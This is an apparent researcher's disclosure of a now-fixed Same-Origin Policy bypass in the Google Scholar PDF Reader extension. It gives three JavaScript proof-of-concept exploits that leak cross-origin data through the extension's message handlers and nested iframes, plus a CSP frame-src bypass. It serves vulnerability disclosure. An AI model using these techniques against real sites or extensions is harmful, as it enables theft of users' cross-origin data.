---
title: SOP bypass in Google Scholar PDF Reader (Fixed)
---
Google Scholar PDF Reader is apparently not an official Google app so was not awarded :( 
Webstore: <https://chromewebstore.google.com/detail/google-scholar-pdf-reader/dahenjhkoodjbpjheillcadbppiidmhp>  

# Leak 1 (With compromised renderer)

```js
// In the context of a content script on any website.
// Leaked data must be JSON.

let x = chrome.runtime.connect();
x.postMessage({type: 'fetch', method: 'GET', url: 'https://www.google.com/something.json', id: 1});
x.onMessage.addListener(console.log);
```

# Leak 2 (Without compromised renderer)

```js
// Embed victim PDF from attacker page.
let f=document.createElement('iframe');
f.width=1000;
f.height=1000;
f.src='https://services.google.com/fh/files/misc/bvp_order_form_google_06162020.pdf'; document.body.appendChild(f);

// Navigate nested, nested frame to attacker controlled page with null origin.
// I think this also creates a race condition version
f.contentWindow[0][0].location = 'https://terjanq.me/xss.php?h[Content-Security-Policy]=sandbox%20allow-scripts';

// On that attacker page, Make sure the target page to leak is the same-origin as the pdf https://services.google.com in this case.
onmessage = async (e) => {
 let reader = e.data.body.pipeThrough(new TextDecoderStream()).getReader();
 let result = await reader.read();
 console.log(result.value);
}
parent.parent.postMessage({type: 'fetch', url: 'https://services.google.com/example'}, '*');
```

# Leak 3 (Without compromised renderer)

```js
let f=document.createElement('iframe');
f.width=1000;
f.height=1000;
f.src='https://services.google.com/fh/files/misc/bvp_order_form_google_06162020.pdf';
document.body.appendChild(f);
```
Selected text gets leaked cross-origin.

```js
onmessage=console.log;
f.contentWindow[0].postMessage({type: 'getSelectedText'}, '*');
```

# Attack scenario
An attacker controlled website can bypass SOP if one of the follow is met:

- Attacker wants JSON data and has a compromised renderer bug
- Attacker wants data from a origin that contains a PDF which allows embedding

# frame-src 'self' bypass
Because of an `about:blank` edge case it's possible to navigate a nested, nested 3rd party iframe to it and bypass the child's CSP.
This has resulted in leaking data due to the victim sending sensitive information to a iframe using the `*` scope that can be hijacked via good navigation timings even with the CSP.  
A GitHub issue was opened about this <https://github.com/w3c/webappsec-csp/issues/662>
